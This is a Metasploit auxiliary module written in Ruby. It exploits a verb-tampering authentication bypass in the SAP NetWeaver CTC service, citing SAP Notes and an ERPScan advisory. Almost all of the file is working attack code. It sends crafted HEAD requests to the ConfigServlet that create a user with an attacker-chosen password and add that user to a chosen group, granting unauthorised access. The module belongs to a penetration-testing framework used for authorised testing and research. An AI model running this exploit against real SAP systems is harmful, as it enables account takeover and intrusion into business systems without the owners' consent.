##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

##
# This module is based on, inspired by, or is a port of a plugin available in
# the Onapsis Bizploit Opensource ERP Penetration Testing framework -
# http://www.onapsis.com/research-free-solutions.php.
# Mariano Nunez (the author of the Bizploit framework) helped me in my efforts
# in producing the Metasploit modules and was happy to share his knowledge and
# experience - a very cool guy.
#
# The following guys from ERP-SCAN deserve credit for their contributions -
# Alexandr Polyakov, Alexey Sintsov, Alexey Tyurin, Dmitry Chastukhin and
# Dmitry Evdokimov.
#
# I'd also like to thank Chris John Riley, Ian de Villiers and Joris van de Vis
# who have Beta tested the modules and provided excellent feedback. Some people
# just seem to enjoy hacking SAP :)
##

require 'msf/core'

class Metasploit4 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name' => 'SAP CTC Service Verb Tampering (add user and add role)',
			'Description' => %q{
					This module exploits an authentication bypass vulnerability in SAP NetWeaver
				CTC service. The service is vulnerable to verb tampering and allows for unauthorised
				user management. SAP Note 1589525, 1624450 / DSECRG-11-041.
			},
			'References' =>
				[
					[ 'URL', 'http://erpscan.com/advisories/dsecrg-11-041-sap-netweaver-authentication-bypass-verb-tampering/' ]
				],
			'Author' => ['nmonkee'],
			'License' => MSF_LICENSE
			)

		register_options([
			OptString.new('USER', [true, 'Username to create']),
			OptString.new('PASS', [true, 'Password for the new user']),
			OptString.new('GROUP', [true, 'Group for the new user'])
		], self.class)
	end

	def run_host(ip)
		uri = '/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;CREATEUSER;USERNAME=' + datastore['USER'] + ',PASSWORD=' + datastore['PASS']
		send_request(uri)
		uri = '/ctc/ConfigServlet?param=com.sap.ctc.util.UserConfig;ADD_USER_TO_GROUP;USERNAME=' + datastore['USER'] + ',GROUPNAME=' + datastore['GROUP']
		send_request(uri)
	end

	def send_request(uri)
		begin
			vprint_status("#{rhost}:#{rport} - Sending request to the CTC service...")
			res = send_request_cgi({
				'uri' => uri,
				'method' => 'HEAD',
				'ctype' => 'text/xml; charset=UTF-8',
				'cookie' => 'sap-usercontext=sap-language=EN'
			})
			if res
				vprint_error("#{rhost}:#{rport} - Error code: " + res.code.to_s)
				vprint_error("#{rhost}:#{rport} - Error title: " + res.message.to_s)
				vprint_error("#{rhost}:#{rport} - Error message: " + res.body.to_s)
			else
				print_good("User successfully added")
			end
		rescue ::Rex::ConnectionError
			print_error("#{rhost}:#{rport} - Unable to connect")
			return
		end
		end
	end
